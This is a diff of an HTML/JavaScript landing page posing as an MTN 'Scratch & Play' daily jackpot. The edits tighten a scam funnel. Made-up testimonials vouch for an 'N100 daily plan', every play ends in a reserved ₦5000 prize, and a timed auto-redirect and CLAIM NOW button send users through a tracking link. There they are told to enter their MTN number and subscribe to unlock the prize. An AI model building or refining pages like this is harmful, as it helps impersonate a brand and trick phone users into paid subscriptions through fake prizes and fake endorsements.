@@ -18,7 +18,7 @@
 
     <!-- 压缩工具生成的样式表已被内联 -->
 
-    <title>MTN Scratch & Play - Daily Reward</title>
+    <title>MTN Scratch & Play - Daily Jackpot</title>
 
     <!-- 性能优化：移除preload，修复404和警告错误 -->
 
@@ -105,7 +105,7 @@
 
         /* 紧急奖励横幅 */
         .alert-banner {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            background: linear-gradient(135deg, #b91c1c 0%, #dc2626 100%);
             color: white;
             padding: 15px 20px;
             text-align: center;
@@ -408,7 +408,7 @@
                     <path d="M10 2 L10 6 M10 14 L10 18 M2 10 L6 10 M14 10 L18 10" stroke="#000" stroke-width="1.5" stroke-linecap="round"/>
                     <path d="M5 5 L7 7 M13 13 L15 15 M15 5 L13 7 M7 13 L5 15" stroke="#000" stroke-width="1" stroke-linecap="round" opacity="0.6"/>
                 </svg>
-                MTN Daily Lucky Draw
+                MTN Scratch & Play - Daily Jackpot
             </h1>
         </div>
         <div class="content">
@@ -419,7 +419,7 @@
                     <circle cx="8" cy="8" r="1" fill="#ffcc00"/>
                     <path d="M7.5 3h1l-.5 1h-1z M7 12h2v1h-2z" fill="#ffcc00" opacity="0.8"/>
                 </svg>
-                Limited Time: Win ₦5000 Daily!
+                Live: Win Cash & Airtime with Daily Plan!
             </div>
 
             <div class="client">
@@ -431,7 +431,7 @@
                     </svg>
                     Exclusive Reward for <span id="date"></span>
                 </strong><br>
-                You've been selected for **MTN Scratch & Play!**
+                You've been selected for the **Daily Winners Club!** Unlock your chance to turn ₦100 into ₦50,000 instantly!
             </div>
 
             <div class="info">
@@ -441,7 +441,7 @@
                         <path d="M9 4 L7 8 L11 8 L9 12 M5 9 L13 9" stroke="#000" stroke-width="1.5" stroke-linecap="round" fill="none"/>
                         <text x="9" y="15" text-anchor="middle" font-family="Arial Black" font-size="4" font-weight="900">₦5000</text>
                     </svg>
-                    Find Hidden ₦5000 Prize!
+                    Match the Items to Win!
                 </h3>
                 Only 7 winners daily • Tap boxes below
             </div>
@@ -462,7 +462,7 @@
                     <div class="comment_img"><img src="img/001-optimized.jpg" alt="Chioma" loading="lazy"></div>
                     <div class="comment-content">
                         <div class="comment_name">Chioma Adebayo</div>
-                        <div class="comment_text">I won ₦2000 airtime! This is legit!</div>
+                        <div class="comment_text">I was skeptical about the N100 daily plan at first, but I tried it and BOOM! Won ₦2000 airtime immediately. Legit!</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="127">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -491,7 +491,7 @@
                     <div class="comment_img"><img src="img/002-optimized.jpg" alt="Tunde" loading="lazy"></div>
                     <div class="comment-content">
                         <div class="comment_name">Tunde Olamide</div>
-                        <div class="comment_text">Just finished! Hope I get the ₦5000 prize</div>
+                        <div class="comment_text">Just subscribed. The code arrived fast via SMS. Hoping to hit the cash jackpot today! Abeg make una wish me luck o!</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="89">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -520,7 +520,7 @@
                     <div class="comment_img"><img src="img/003-optimized.jpg" alt="Zainab" loading="lazy"></div>
                     <div class="comment-content">
                         <div class="comment_name">Zainab Sani</div>
-                        <div class="comment_text">Thanks MTN! Got access to premium games!</div>
+                        <div class="comment_text">My friend won yesterday so I joined via the daily plan. Best way to verify is to use your main MTN line.</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="203">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -660,7 +660,7 @@
             // 如果URL解析失败，使用默认值
         }
 
-        const shareText = "🎯 Check out MTN Daily Lucky Draw! Win ₦5000 daily prizes! 🎉";
+        const shareText = "🎯 Check out MTN Scratch & Play - Daily Jackpot! Win ₦5000 daily prizes! 🎉";
 
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(shareText + ' ' + currentUrl).then(() => {
@@ -740,8 +740,8 @@
         const swalWithTimer = Swal.mixin({
             icon: 'success',
             iconHtml: '<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="url(#successGrad)" stroke="#ff6b35" stroke-width="2"/><path d="M8 12l2 2 4-6" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="successGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ffcc00;stop-opacity:1"/><stop offset="100%" style="stop-color:#ff6b35;stop-opacity:1"/></linearGradient></defs></svg>',
-            title: 'Congratulations! You Won!',
-            html: '<h3>You won **₦5000** in MTN Rewards!</h3><br><strong><span id="countdown">' + countdownSeconds + '</span> seconds until auto-redirect to MTN partner page</strong><br><small style="color:#666;">• Secure MTN official partner website<br>• Enter your MTN number to activate daily reward<br><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top:10px;">Cancel Redirect</button>',
+            title: 'Match Found! Prize Reserved.',
+            html: '<div style="text-align: center;"><h3 style="color: #000;">MATCH FOUND!</h3><p>You have matched the winning items!</p><div style="background: #fff3cd; padding: 10px; border-radius: 8px; border: 1px dashed #ffcc00; margin: 10px 0;"><strong>YOUR PRIZE: ₦5000 Cash/Airtime</strong><br><span style="color: #dc3545; font-size: 0.9em;">Status: Pending Activation</span></div><p><strong>Final Step to Claim:</strong></p><ol style="text-align: left; margin: 0 auto; display: inline-block;"><li>Click <strong>"CLAIM NOW"</strong> below.</li><li>Enter your MTN number on the next page.</li><li>Subscribe to the <strong>N100 Daily Plan</strong> to unlock your prize wallet!</li></ol><br><strong><span id="countdown">' + countdownSeconds + '</span> seconds until auto-redirect...</strong><br><small style="color:#666;">• Secure MTN official partner website<br>• Enter your MTN number to activate daily plan<br><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top:10px;">Cancel Redirect</button></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
             timer: countdownSeconds * 1000,
@@ -786,11 +786,11 @@
     function dialog3Manual() {
         Swal.fire({
             icon: 'success',
-            title: '🎉 恭喜中奖！',
-            html: '<h3>恭喜你获得 **₦5000** 大奖!</h3><br>**Next Steps to Claim:**<br>1. Click "CONFIRM" below.<br>2. You will be redirected to the secure **MTN Partner** site.<br>3. Enter your MTN number to activate the daily plan and get your reward!',
+            title: 'Match Found! Prize Reserved.',
+            html: '<div style="text-align: center;"><h3 style="color: #000;">MATCH FOUND!</h3><p>You have matched the winning items!</p><div style="background: #fff3cd; padding: 10px; border-radius: 8px; border: 1px dashed #ffcc00; margin: 10px 0;"><strong>YOUR PRIZE: ₦5000 Cash/Airtime</strong><br><span style="color: #dc3545; font-size: 0.9em;">Status: Pending Activation</span></div><p><strong>Final Step to Claim:</strong></p><ol style="text-align: left; margin: 0 auto; display: inline-block;"><li>Click <strong>"CLAIM NOW"</strong> below.</li><li>Enter your MTN number on the next page.</li><li>Subscribe to the <strong>N100 Daily Plan</strong> to unlock your prize wallet!</li></ol><br><small style="color:#666;">• Official MTN Partner Site<br>• N100 Daily Plan activation required</small></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<button onclick="window.location.href = \'https://84ql3.bemobtrcks.com/click\';" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CONFIRM & CLAIM NOW ➤</button>'
+            footer: '<button onclick="window.location.href = \'https://84ql3.bemobtrcks.com/click\';" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CLAIM NOW ➤</button>'
         });
     }
 
